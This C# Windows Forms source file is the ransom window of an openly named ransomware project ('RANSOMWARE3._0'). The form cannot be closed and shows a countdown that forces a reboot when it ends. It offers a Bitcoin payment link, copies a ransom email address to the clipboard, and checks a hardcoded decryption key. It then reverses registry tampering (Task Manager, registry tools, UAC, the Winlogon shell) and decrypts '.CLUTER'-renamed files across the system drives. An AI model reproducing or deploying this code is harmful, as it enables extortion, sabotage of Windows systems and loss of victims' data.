using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace RANSOMWARE3._0
{
    public partial class Window : Form
    {
        public Window()
        {
            InitializeComponent();
        }

        private void Window_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Window_Load(object sender, EventArgs e)
        {
            Size = new Size(713, 663);
            lbl_title.Location = new Point(12, 7);
            logo.Size = new Size(203, 187);
            logo.Location = new Point(12, 55);
            text1.Size = new Size(465, 187);
            text1.Location = new Point(221, 55);
            bit_logo.Size = new Size(397, 108);
            bit_logo.Location = new Point(12, 248);
            lbl_title2.Location = new Point(415, 251);
            text2.Size = new Size(271, 120);
            text2.Location = new Point(415, 299);
            box_email.Size = new Size(295, 26);
            box_email.Location = new Point(12, 362);
            box_key.Size = new Size(295, 26);
            box_key.Location = new Point(12, 394);
            btn_copy.Size = new Size(96, 26);
            btn_copy.Location = new Point(313, 362);
            btn_decrypt.Size = new Size(96, 26);
            btn_decrypt.Location = new Point(313, 394);
            lbl_date.Location = new Point(35, 433);
            title_time.Location = new Point(38, 467);
            lbl_count.Location = new Point(54, 533);
            link_bit.Location = new Point(377, 474);
            link_click.Location = new Point(377, 512);
            link_ransom.Location = new Point(377, 550);
            lbl_date.Text = DateTime.Now.ToString("dddd , MMM dd yyyy,hh:mm:ss");
        }

        private void link_bit_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            ProcessStartInfo sInfo = new ProcessStartInfo("https://en.wikipedia.org/wiki/Bitcoin");
            Process.Start(sInfo);
        }

        private void link_click_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            ProcessStartInfo sInfo = new ProcessStartInfo("https://supercoin.it/cz-trading-platform/16228?sorgente=2&gclid=CjwKCAjw3cSSBhBGEiwAVII0Z-8AbRF_QvW-BPUbt_LJ66RruwyMEYjK3QmldW2vvkO4nNPB9oJEMhoCcz4QAvD_BwE");
            Process.Start(sInfo);
        }

        private void link_ransom_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            ProcessStartInfo sInfo = new ProcessStartInfo("https://en.wikipedia.org/wiki/Ransomware");
            Process.Start(sInfo);
        }

        private void btn_decrypt_Click(object sender, EventArgs e)
        {
            if (box_key.Text == "mypassword") //password for decrypt
            {
                Thread newbackup = new Thread(backup);
                newbackup.Start();
                MessageBox.Show("Correct key, your files were decrypted!", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else if (box_key.Text == "")
            {
                MessageBox.Show("Incorrect key", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                MessageBox.Show("Incorrect key", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void backup()
        {
            //Create file "decrypted" on desktop
            File.Create(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\decrypted");
            //Regs to back
            RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
            RegistryKey key = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            key.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
            RegistryKey dis_taskmgr = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            dis_taskmgr.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
            RegistryKey dis_reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            dis_reg.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
            RegistryKey logon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            logon.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
            RegistryKey init = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            init.SetValue("Userinit", @"C:\Windows\System32\userinit.exe", RegistryValueKind.String);
            if(File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\BSOD.exe"))
            {
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\BSOD.exe");
            }
            //Char
            char[] mychar = { 'C', 'L', 'U', 'T', 'E', 'R', '.' };
            //Voids
            try
            {
                string[] path_c = Directory.GetFiles(@"C:\");
                foreach (string name_x in path_c)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_program = Directory.GetFiles(@"C:\Program Files");
                foreach (string name_x in path_program)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_programx86 = Directory.GetFiles(@"C:\Program Files (x86)");
                foreach (string name_x in path_programx86)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_users = Directory.GetFiles(@"C:\Users");
                foreach (string name_x in path_users)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_win = Directory.GetFiles(@"C:\Windows");
                foreach (string name_x in path_win)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_sys = Directory.GetFiles(@"C:\Windows\System32");
                foreach (string name_x in path_sys)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_app = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string[] path_app_F = Directory.GetFiles(path_app);
                foreach (string name_x in path_app_F)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_userprof = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string[] path_userprof_F = Directory.GetFiles(path_userprof);
                foreach (string name_x in path_userprof_F)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_mydoc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string[] path_mydoc_F = Directory.GetFiles(path_mydoc);
                foreach (string name_x in path_mydoc_F)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_mymus = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
                string[] path_mymus_F = Directory.GetFiles(path_mymus);
                foreach (string name_x in path_mymus_F)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_mypic = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
                string[] path_mypic_F = Directory.GetFiles(path_mypic);
                foreach (string name_x in path_mypic_F)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_myvids = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
                string[] path_myvids_F = Directory.GetFiles(path_myvids);
                foreach (string name_x in path_myvids_F)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_des = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string[] path_des_F = Directory.GetFiles(path_des);
                foreach (string name_x in path_des_F)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_dis = { @"A:\", @"B:\", @"D:\", @"E:\", @"F:\", @"G:\", @"H:\", @"CH:\", @"I:\", @"J:\", @"K:\", @"L:\", @"M:\", @"N:\",
                @"O:\", @"P:\", @"Q:\", @"R:\", @"S:\", @"T:\", @"U:\", @"V:\", @"W:\", @"X:\", @"Y:\", @"Z:\"};
                foreach (string name_x in path_dis)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            Hide(); //Just hide window
        }

        int delay = 10800;
        private void timer1_Tick(object sender, EventArgs e)
        {
            if(delay >= 0)
            {
                TimeSpan time = TimeSpan.FromSeconds(delay -= 1);
                lbl_count.Text = time.ToString(@"hh\:mm\:ss");
            }
            else
            {
                ProcessStartInfo restart = new ProcessStartInfo();
                restart.FileName = "shutdown.exe";
                restart.WindowStyle = ProcessWindowStyle.Hidden;
                restart.Arguments = "shutdown /r /t 0";
                Process.Start(restart);
                Environment.Exit(-1);
            }
        }

        private void DecryptFile(string inputFile, string outputFile)
        {
            try
            {
                string password = @"d5a01s9u";

                UnicodeEncoding UE = new UnicodeEncoding();
                byte[] key = UE.GetBytes(password);

                FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);

                RijndaelManaged RMCrypto = new RijndaelManaged();

                CryptoStream cs = new CryptoStream(fsCrypt,
                    RMCrypto.CreateDecryptor(key, key),
                    CryptoStreamMode.Read);

                FileStream fsOut = new FileStream(outputFile, FileMode.Create);

                int data;
                while ((data = cs.ReadByte()) != -1)
                    fsOut.WriteByte((byte)data);

                fsOut.Close();
                cs.Close();
                fsCrypt.Close();

            }
            catch { }
        }

        private void lbl_count_Click(object sender, EventArgs e)
        {

        }

        private void btn_copy_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() => Clipboard.SetText("notvalidemailadress.ransom@gmail.com"));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            thread.Join();
        }
    }
}
